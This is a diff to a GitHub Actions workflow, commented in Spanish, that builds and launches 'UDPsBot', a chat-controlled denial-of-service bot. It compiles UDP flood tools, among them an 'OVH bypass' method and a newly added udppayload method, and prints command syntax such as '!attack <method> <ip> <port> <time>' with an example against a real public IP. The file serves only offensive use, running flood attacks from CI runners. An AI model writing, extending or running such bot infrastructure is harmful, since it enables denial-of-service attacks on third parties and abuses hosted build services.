@@ -1,4 +1,4 @@
-name: UDPBot Best
+name: UDPsBot
 
 on:
   workflow_dispatch:
@@ -32,7 +32,6 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y build-essential
-          sudo apt-get install -y libpcap-dev || true
 
       - name: Build UDP binaries
         run: |
@@ -42,7 +41,7 @@ jobs:
             echo "✓ Compilado: udp (de udp.c)"
             chmod +x udp
           else
-            echo "✗ udp.c no encontrado, omitiendo compilación de udp"
+            echo "✗ udp.c no encontrado"
           fi
 
           # Compilar udphex (antiguo udphexv2)
@@ -51,51 +50,58 @@ jobs:
             echo "✓ Compilado: udphex (de udphex.c)"
             chmod +x udphex
           else
-            echo "✗ udphex.c no encontrado, omitiendo compilación de udphex"
+            echo "✗ udphex.c no encontrado"
           fi
 
-          # Compilar nuevo método udppps
+          # Compilar udppps
           if [ -f udppps.c ]; then
             gcc -O3 udppps.c -o udppps || true
-            echo "✓ Compilado: udppps (nuevo método)"
+            echo "✓ Compilado: udppps"
             chmod +x udppps
           else
-            echo "✗ udppps.c no encontrado, omitiendo compilación de udppps"
+            echo "✗ udppps.c no encontrado"
           fi
 
-          # Compilar ovh.c (método OVH bypass)
+          # Compilar ovh.c
           if [ -f ovh.c ]; then
             gcc -O3 -pthread ovh.c -o ovh || true
             if [ -f ovh ]; then
-              echo "✓ Compilado: ovh (método OVH bypass)"
+              echo "✓ Compilado: ovh"
               chmod +x ovh
-            else
-              echo "⚠ Error al compilar ovh.c, revisa dependencias"
             fi
           else
             echo "✗ ovh.c no encontrado"
           fi
 
+          # Compilar udppayload.c (nuevo método)
+          if [ -f udppayload.c ]; then
+            gcc -O3 -pthread udppayload.c -o udppayload || true
+            if [ -f udppayload ]; then
+              echo "✓ Compilado: udppayload (nuevo método)"
+              chmod +x udppayload
+            fi
+          else
+            echo "✗ udppayload.c no encontrado"
+          fi
+
           # Verificar udpflood.go
           if [ -f udpflood.go ]; then
-            echo "✓ Encontrado: udpflood.go (método Go)"
-            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go, pero funcionará con 'go run'"
+            echo "✓ Encontrado: udpflood.go"
+            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go"
           else
             echo "✗ udpflood.go no encontrado"
           fi
 
-          # Listar archivos compilados
+          # Listar archivos
           echo ""
           echo "=== Archivos disponibles ==="
-          for bin in udp udphex udppps ovh udpflood; do
+          for bin in udp udphex udppps ovh udppayload udpflood; do
             if [ -f "$bin" ]; then
               echo "✓ $bin (ejecutable)"
+            elif [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
+              echo "✓ $bin (archivo fuente presente)"
             else
-              if [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
-                echo "✓ $bin (archivo fuente presente)"
-              else
-                echo "✗ $bin (no encontrado)"
-              fi
+              echo "✗ $bin (no encontrado)"
             fi
           done
           echo "====================================="
@@ -112,19 +118,12 @@ jobs:
           echo "  !attack udppps <ip> <puerto> <tiempo>"
           echo "  !attack udpflood <ip> <puerto> <tiempo>"
           echo "  !attack ovh <ip> <puerto> <tiempo>"
+          echo "  !attack udppayload <ip> <puerto> <tiempo> <payload>"
           echo "  !methods - Muestra información de métodos"
+          echo ""
+          echo "Ejemplo payload:"
+          echo "  !attack udppayload 1.1.1.1 80 60 \"GET / HTTP/1.1\\r\\nHost: 1.1.1.1\\r\\n\\r\\n\""
           echo "====================================="
-          
-          # Probar que Go funciona
-          echo "Probando Go..."
-          go version
-          
-          # Verificar permisos para sudo si existe ovh
-          if [ -f ovh ]; then
-            echo "Verificando ejecutable ovh..."
-            ls -la ovh
-            echo "Nota: ovh requiere permisos de root para raw sockets"
-          fi
           
           echo ""
           echo "Iniciando bot..."
